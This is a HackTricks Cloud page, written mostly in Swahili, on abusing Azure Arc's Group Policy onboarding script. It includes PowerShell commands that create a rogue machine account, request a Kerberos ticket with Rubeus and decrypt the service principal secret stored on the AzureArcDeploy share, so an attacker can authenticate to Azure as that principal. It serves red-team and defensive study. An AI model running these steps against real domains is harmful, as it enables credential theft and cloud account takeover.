# Az - Azure Arc Vulnerable GPO Deploy Script

{% hint style="success" %}
Jifunze na zoezi la AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na zoezi la GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Kutambua Matatizo

Azure Arc inaruhusu uingizaji wa seva za ndani mpya (seva zilizojiunga na kikoa) ndani ya Azure Arc kwa kutumia mbinu ya Group Policy Object. Ili kurahisisha hili, Microsoft hutoa zana ya upelekaji inayohitajika kuanzisha mchakato wa kujiunga. Ndani ya faili ya ArcEnableServerGroupPolicy.zip, hati zifuatazo zinaweza kupatikana: DeployGPO.ps1, EnableAzureArc.ps1, na AzureArcDeployment.psm1.

Inapotekelezwa, hati ya DeployGPO.ps1 hufanya vitendo vifuatavyo:

1. Inaunda Azure Arc Servers Onboarding GPO ndani ya kikoa la ndani.
2. Inakopi hati ya kujiunga ya EnableAzureArc.ps1 kwenye sehemu ya mtandao iliyoundwa kwa mchakato wa kujiunga, ambayo pia ina pakiti ya usanidi ya Windows.

Wakati wa kukimbia hati hii, wasimamizi wa mfumo wanahitaji kutoa vigezo viwili muhimu: **ServicePrincipalId** na **ServicePrincipalClientSecret**. Aidha, inahitaji vigezo vingine kama kikoa, FQDN ya seva inayohifadhi sehemu, na jina la sehemu. Maelezo zaidi kama vile kitambulisho cha mpangaji, kikundi cha rasilimali, na habari nyingine muhimu lazima pia zitolewe kwa hati.

Siri iliyofichwa inazalishwa kwenye saraka ya AzureArcDeploy kwenye sehemu iliyotajwa kwenye sehemu kwa kutumia encryption ya DPAPI-NG. Siri iliyofichwa hifadhiwa kwenye faili iliyoitwa encryptedServicePrincipalSecret. Ushahidi wa hili unaweza kupatikana kwenye hati ya DeployGPO.ps1, ambapo encryption inatekelezwa kwa kuita ProtectBase64 na $descriptor na $ServicePrincipalSecret kama viingizo. Descripta inajumuisha SIDs za vikundi vya Domain Computer na Domain Controller, ikihakikisha kuwa ServicePrincipalSecret inaweza kufichuliwa tu na vikundi vya usalama vya Domain Controllers na Domain Computers, kama ilivyobainishwa katika maoni ya hati.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Kuchexploit

Tunayo hali zifuatazo:

1. Tumevamia mtandao wa ndani kwa mafanikio.
2. Tuna uwezo wa kuunda au kuchukua udhibiti wa akaunti ya kompyuta ndani ya Active Directory.
3. Tumeigundua sehemu ya mtandao inayoitwa AzureArcDeploy.

Kuna njia kadhaa za kupata akaunti ya mashine ndani ya mazingira ya AD. Moja ya njia za kawaida ni kuchexploitisha kiwango cha akaunti ya mashine. Njia nyingine inahusisha kudhoofisha akaunti ya mashine kupitia ACLs zenye mapungufu au mizunguko mingine mbalimbali ya usanidi.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
Baada ya akaunti ya mashine kupatikana, ni sawa kuthibitisha kutumia akaunti hii. Tunaweza kutumia amri ya runas.exe pamoja na bendera ya netonly au kutumia pass-the-ticket na Rubeus.exe.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
Kwa kuwa na TGT kwa akaunti yetu ya kompyuta iliyohifadhiwa kumbukani, tunaweza kutumia script ifuatayo kufichua siri ya mkuu wa huduma.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
Kwa upande mwingine, tunaweza kutumia [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG).

Kwa wakati huu, tunaweza kukusanya habari iliyobaki inayohitajika kuunganisha kwenye Azure kutoka kwa faili ya ArcInfo.json, ambayo imehifadhiwa kwenye folda sawa na faili ya encryptedServicePrincipalSecret. Faili hii ina maelezo kama: TenantId, servicePrincipalClientId, ResourceGroup, na zingine. Kwa habari hii, tunaweza kutumia Azure CLI kujithibitisha kama service principal iliyoharibiwa.

## Marejeo

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)
